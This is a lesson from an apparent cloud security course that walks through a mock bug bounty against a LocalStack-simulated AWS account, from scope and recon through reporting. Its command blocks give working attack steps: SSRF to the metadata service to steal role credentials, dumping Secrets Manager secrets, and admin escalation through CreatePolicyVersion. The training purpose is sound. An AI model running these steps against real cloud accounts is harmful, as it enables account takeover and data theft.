---
title: "Cloud Practice — Mock Bug Bounty Cloud Engagement"
tags: [cloud-practice, AWS, bug-bounty, mock-engagement, reconnaissance, IAM,
       S3, SSRF, enumeration, findings, report, LocalStack, HackerOne, ATT&CK]
module: 04-BroadSurface-02
day: 208
related_topics:
  - Cloud Threat Model (Day 181)
  - Cloud Full Attack Lab (Day 192)
  - Cloud Bug Bounty Recon (Day 205)
  - Cloud Kill Chain Speed Run (Day 207)
  - Cloud Practice: Report Writing (Day 209)
---

# Day 208 — Cloud Practice: Mock Bug Bounty Cloud Engagement

> "Bug bounty is not a CTF. There is no flag hidden at a known depth. The target
> does not know you are coming, it was not designed to be broken, and the hardest
> part is not the exploit — it is the reconnaissance that tells you where to look.
> Today you do the full thing: scope review, recon, test, validate, document. Same
> workflow you would use on a real programme. Do not shortcut any phase."
>
> — Ghost

---

## Goals

By the end of today's engagement you will have:

1. Completed a structured bug bounty recon pass on a mock AWS cloud target.
2. Identified and validated at least 3 exploitable cloud misconfigurations.
3. Written a complete finding for each confirmed vulnerability.
4. Built an attack path diagram showing how findings chain together.
5. Produced a submission-ready report for the highest-severity finding.

**Time budget:** 6–8 hours.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Cloud Recon methodology | Day 205 |
| Kill chain execution fluency | Day 207 |
| LocalStack + Docker running | Previous setup |
| AWS CLI configured | `export AWS_ENDPOINT_URL=http://localhost:4566` |

---

## Programme Brief

This is your target brief. Read it as you would read a real HackerOne programme policy.

```
Programme: Nimbus Financial Services — Cloud Infrastructure
Scope:      *.nimbus-financial.internal (LocalStack simulation)
            AWS Account: 000000000000

In scope:
  - All S3 buckets owned by the account
  - All IAM roles and policies
  - EC2/ECS workloads exposed via the internal ALB
  - Lambda functions
  - Secrets Manager secrets

Out of scope:
  - DDoS or rate-limit testing
  - Social engineering
  - Physical access
  - Modifying or deleting production data

Rewards:
  P1 (Critical): $5,000–$10,000
  P2 (High):     $1,000–$4,999
  P3 (Medium):   $250–$999
  P4 (Low):      $50–$249

Special notes:
  - Automated scanning must be throttled to ≤ 10 requests per second
  - Any finding that results in account-level administrator access is an automatic P1
  - Duplicate submissions within 90 days of a closed report are not eligible
```

---

## Lab Setup

```bash
# Start the mock bug bounty environment
cd 04-BroadSurface-02/samples/mock-bb-lab/
docker compose up -d

# Environment includes:
#   - Misconfigured S3 buckets (public + private with over-permissive policy)
#   - An SSRF-vulnerable web application at http://localhost:8080
#   - IAM roles with exploitable misconfigurations
#   - Secrets Manager with test secrets
#   - CloudTrail logging to LocalStack S3
#   - A Lambda function with a known policy misconfiguration

# Confirm lab is up
curl -s http://localhost:8080/health
aws s3 ls  # should return bucket list without credentials

source .env
```

---

## Phase 1 — Passive Recon (45 min)

Do not touch the application yet. Gather everything you can from public exposure.

### S3 Bucket Discovery

```bash
# Test for public bucket listing (no credentials)
# Pattern: company name + common suffixes
for suffix in "" "-assets" "-backup" "-dev" "-staging" "-logs" "-data" \
              "-public" "-static" "-uploads" "-exports" "-reports"; do
  bucket="nimbus-financial${suffix}"
  result=$(aws s3 ls s3://${bucket} 2>&1)
  if echo "$result" | grep -qv "NoSuchBucket\|AccessDenied"; then
    echo "[OPEN] s3://${bucket}"
    echo "$result" | head -5
  fi
done
```

Record each bucket you discover. For open buckets, note:
- File count and total size estimate
- Any obviously sensitive filenames (`.sql`, `.env`, `.pem`, `.key`, `backup`, `config`)
- Last modified dates — recent activity suggests live data

### IAM Reconnaissance Without Credentials

```bash
# Check if the account has any public-facing IAM information exposed
# (Some misconfigured environments expose role names via error messages)

# Attempt unauthenticated STS calls — document the error type
aws sts get-caller-identity 2>&1

# Check for bucket policies that reveal IAM structure
aws s3api get-bucket-policy --bucket nimbus-financial-assets 2>&1

# Try to list public SNS topics or SQS queues
aws sns list-topics 2>&1
aws sqs list-queues 2>&1
```

### Application Fingerprinting

```bash
# Identify the application stack
curl -sv http://localhost:8080/ 2>&1 | grep -i "server\|x-powered\|via\|cf-ray"

# Directory enumeration (light — respect rate limits)
for path in /api /api/v1 /api/v2 /health /status /metrics /debug \
            /swagger /swagger.json /openapi.json /graphql /admin; do
  code=$(curl -so /dev/null -w "%{http_code}" http://localhost:8080${path})
  [ "$code" != "404" ] && echo "[${code}] http://localhost:8080${path}"
done
```

---

## Phase 2 — Active Enumeration (60 min)

### S3 Bucket Deep Dive

For each open bucket found in Phase 1:

```bash
# Full recursive listing
aws s3 ls s3://{bucket}/ --recursive --human-readable | tee bucket-listing.txt

# Download anything interesting — never download the whole bucket
# Look for: configs, backups, credentials, keys, exports, source code
aws s3 cp s3://{bucket}/config/ ./evidence/ --recursive
aws s3 cp s3://{bucket}/exports/ ./evidence/ --recursive

# Check the bucket policy for over-permissive access
aws s3api get-bucket-policy --bucket {bucket} | jq .
aws s3api get-bucket-acl --bucket {bucket} | jq .

# Check for server-side encryption — absence is a finding
aws s3api get-bucket-encryption --bucket {bucket} 2>&1

# Check for public access block — if not set, it is a finding
aws s3api get-public-access-block --bucket {bucket} 2>&1
```

Document every bucket policy that contains `"Principal": "*"` — that is a
misconfiguration regardless of which actions it grants.

### SSRF Testing

```bash
# Test the fetch endpoint — confirm SSRF exists
curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/"

# Enumerate IMDS — only what you need, methodically
# Do not spray random paths; enumerate the tree top-down
curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/"
curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Note the role name from the above response, then:
ROLE_NAME="<name-from-above>"
curl "http://localhost:8080/fetch?url=\
http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE_NAME}"
```

Capture the complete response. This is your evidence for the SSRF + IMDS finding.
Screenshot or `tee` the output — you will need it for the report.

### IAM Enumeration with SSRF Credentials

```bash
# Export the stolen credentials
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Confirm identity
aws sts get-caller-identity | tee evidence/sts-identity.json

# Enumerate attached policies — document every one
ROLE=$(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
aws iam list-attached-role-policies --role-name "${ROLE}" \
  | tee evidence/attached-policies.json

# Get the policy documents — these show the exact permissions
aws iam list-attached-role-policies --role-name "${ROLE}" \
  --query 'AttachedPolicies[*].PolicyArn' --output text | tr '\t' '\n' | \
while read arn; do
  echo "=== ${arn} ==="
  VERSIONID=$(aws iam get-policy --policy-arn "${arn}" \
    --query 'Policy.DefaultVersionId' --output text)
  aws iam get-policy-version --policy-arn "${arn}" \
    --version-id "${VERSIONID}" --query 'PolicyVersion.Document' \
    | tee "evidence/policy-${arn##*/}.json"
done

# Enumerate secrets — document what exists
aws secretsmanager list-secrets | tee evidence/secrets-list.json

# Attempt to read each secret (document success or AccessDenied)
aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text | \
  tr '\t' '\n' | while read name; do
    echo "=== Secret: ${name} ==="
    aws secretsmanager get-secret-value --secret-id "${name}" 2>&1 \
      | tee "evidence/secret-${name}.json"
  done

# Enumerate Lambda functions
aws lambda list-functions | tee evidence/lambda-list.json

# Check each function's policy
aws lambda list-functions --query 'Functions[*].FunctionName' --output text | \
  tr '\t' '\n' | while read fn; do
    aws lambda get-policy --function-name "${fn}" 2>&1
  done
```

---

## Phase 3 — Exploitation and Impact Validation (90 min)

Exploitation is not about running everything you can. It is about validating
the **business impact** of each finding. Before you exploit anything, ask:
"What is the worst-case outcome of this vulnerability? Can I demonstrate that
without causing actual harm?"

### Finding 1 — Public S3 Bucket

Validate impact:
```bash
# What data can an unauthenticated attacker read?
aws s3 cp s3://{open-bucket}/most-sensitive-file.json ./evidence/ --no-sign-request

# What can they write? (If write access is granted — test with a canary file)
echo '{"test": "nimbus-bb-canary"}' > canary.json
aws s3 cp canary.json s3://{open-bucket}/pentest-canary.json --no-sign-request
# If successful: document, then DELETE IT immediately
aws s3 rm s3://{open-bucket}/pentest-canary.json --no-sign-request

# Does the bucket contain credentials, PII, or financial data?
# If yes: this is P1. Do not read more than you need to prove the finding.
```

### Finding 2 — SSRF + IMDS Credential Exposure

Impact is already validated — you have credentials. Now determine their
privilege level to set the severity.

```bash
# Can you read all S3 buckets? (Demonstrates data access impact)
aws s3 ls

# Can you modify IAM? (Demonstrates privilege escalation potential)
aws iam list-users 2>&1

# Can you read Secrets Manager? (Demonstrates secrets exposure)
aws secretsmanager list-secrets 2>&1

# Document the exact permission set — the impact section of your report
# should state precisely what an attacker can do with these credentials
```

### Finding 3 — IAM Privilege Escalation (if applicable)

If enumeration reveals an escalation path:

```bash
# CreatePolicyVersion path:
POLICY_ARN="arn:aws:iam::000000000000:policy/NimbusAppPolicy"
aws iam create-policy-version \
  --policy-arn "${POLICY_ARN}" \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
  }' \
  --set-as-default | tee evidence/privesc-policy.json

# Validate admin access
aws iam list-users | tee evidence/post-escalation-iam.json

# This is a P1 — document and stop. Do not persist, do not exfiltrate further.
```

### Finding 4 — Secrets Manager / Hardcoded Credentials

```bash
# For each accessible secret, document what type of credential it is
# (database password, API key, service account, etc.)
# and assess rotation status
aws secretsmanager describe-secret --secret-id {name} \
  --query '[LastRotatedDate, RotationEnabled]' --output table
```

---

## Phase 4 — Attack Path Diagram (30 min)

Draw (text diagram is fine) the kill chain showing how findings connect:

```
Unauthenticated         SSRF                   IMDS
External Attacker  -->  /fetch?url=  -->  169.254.169.254  -->  Role Credentials
                                                                      |
                        +---------------------------------------------+
                        |
                        v
                  IAM Enumeration
                  (list-attached-role-policies)
                        |
             +----------+----------+
             |                     |
             v                     v
        PrivEsc Path          Secrets Access
     (CreatePolicyVersion)   (secretsmanager)
             |                     |
             v                     v
       Admin Access          DB Password / API Key
       (all actions)               |
             |                     |
             +----------+----------+
                        |
                        v
                 Data Breach + Account Takeover
```

For each arrow, note the AWS API call that makes it possible. This diagram
becomes the "attack narrative" section of your report.

---

## Phase 5 — Findings Documentation (60 min)

Write one complete finding for each confirmed vulnerability. Use this template:

```
## Finding: [Title]

**Severity:** [Critical | High | Medium | Low | Informational]
**CVSS 3.1:** [Score] ([AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N] or similar)
**CWE:** [CWE-XXX — Name]
**ATT&CK:** [T-XXXX — Technique Name]

### Description
[2–3 paragraphs: what the vulnerability is, why it exists in this environment,
and what an attacker can achieve.]

### Steps to Reproduce
1. [Exact command or request — reproducible by a stranger]
2. [Expected output at each step]
3. [Final proof of impact]

### Evidence
- Command run: `[exact command]`
- Output: [paste relevant excerpt — not the whole output]
- Screenshot path: evidence/finding-N-screenshot.png (if applicable)

### Impact
[Specific business impact: "An unauthenticated attacker can read all objects
in s3://nimbus-financial-exports including files matching *.csv which contain
customer names, account numbers, and balances."]

### Remediation
[Specific, actionable fix — not "follow best practices"]

### References
- [AWS documentation or CWE/CVE reference]
```

---

## Phase 6 — Submission Triage (15 min)

Before submitting each finding, ask:

| Question | If No → Action |
|---|---|
| Is the vulnerability in scope per the programme policy? | Do not submit |
| Can a stranger reproduce this from your steps alone? | Rewrite the PoC |
| Does your severity match the CVSS score you calculated? | Recalibrate |
| Have you confirmed this is not already reported (duplicate check)? | Check the public programme wall |
| Is your impact statement specific and measurable? | Rewrite it |
| Have you cleaned up any canary files or test artefacts? | Clean up now |

**Clean-up checklist:**
```bash
# Remove any canary files you wrote during testing
aws s3 rm s3://{bucket}/pentest-canary.json --no-sign-request 2>/dev/null

# Remove any policy versions you created during PrivEsc testing
# (In a real engagement this would require coordination with the programme)

# Unset the stolen credentials from your shell
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

---

## Expected Findings Inventory

You should have found at least 3 of these 5 by the end of Phase 3:

| Finding | Expected Severity | ATT&CK Technique |
|---|---|---|
| Unauthenticated S3 bucket read access | High (P2) | T1530 — Data from Cloud Storage Object |
| SSRF to IMDS credential theft | Critical (P1) | T1552.005 — Cloud Instance Metadata API |
| IAM privilege escalation via CreatePolicyVersion | Critical (P1) | T1484.001 — Domain Policy Modification |
| Secrets Manager secret readable by app role | High (P2) | T1552.001 — Credentials in Files |
| S3 bucket missing server-side encryption | Informational (P4) | T1530 (detection gap) |

If you found fewer than 3: go back to Phase 2 enumeration. Something was missed.

---

## Key Takeaways

1. **Recon determines everything.** Exploitation is mechanical once you know
   where the misconfigurations are. The quality of your report is determined
   by the quality of your recon.
2. **Evidence collection is not optional.** In a real bug bounty, a finding
   without a reproducible PoC will be marked "informational" or closed as
   "not enough information." Collect evidence at every step, not at the end.
3. **Impact framing wins bounties.** "S3 bucket is publicly accessible" is a
   Low. "S3 bucket is publicly accessible and contains customer account numbers
   and SSNs for 50,000 accounts" is a Critical. The vulnerability class is the
   same; the impact framing is not.
4. **Attack path diagrams change severity conversations.** A single SSRF
   finding might be Medium in isolation. When you show that SSRF → credentials
   → admin access → full account compromise, the programme triager immediately
   understands why it is Critical.
5. **Clean up matters.** Leaving canary files, new IAM users, or modified
   policies in a bug bounty environment is unprofessional and can damage your
   reputation on the platform. Always leave the environment cleaner than
   you found it.

---

## Exercises

1. Write a bash script that automates Phase 1 (S3 bucket discovery + policy
   check) for a given account ID and list of common bucket name suffixes. The
   script should output a findings summary with severity labels.

2. For each finding you documented, calculate the CVSS 3.1 base score manually
   using the CVSS calculator. Compare the scores. Do they match the severity
   labels you assigned intuitively? If not, which metric did you mis-score?

3. Research: what is the difference between an S3 bucket ACL and an S3 bucket
   policy? Which one can be used to make a bucket public even when the account
   has "Block Public Access" enabled at the account level? What AWS Config rule
   detects each?

4. Write the AWS CloudTrail detection query (jq or Athena SQL) that would
   identify the SSRF attack from Phase 2 — specifically: a temporary IAM
   role credential (ASIA* key) making API calls from an IP address that is not
   the EC2 instance the role is assigned to.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q208.1, Q208.2 …).
> Follow-up questions use hierarchical numbering (Q208.1.1, Q208.1.2 …).

---

## Navigation

← Previous: [Day 207 — Cloud Practice: Full Kill Chain Speed Run](DAY-0207-Cloud-Practice-Kill-Chain-Speed-Run.md)
→ Next: [Day 209 — Cloud Practice: Report Writing Sprint](DAY-0209-Cloud-Practice-Report-Writing.md)
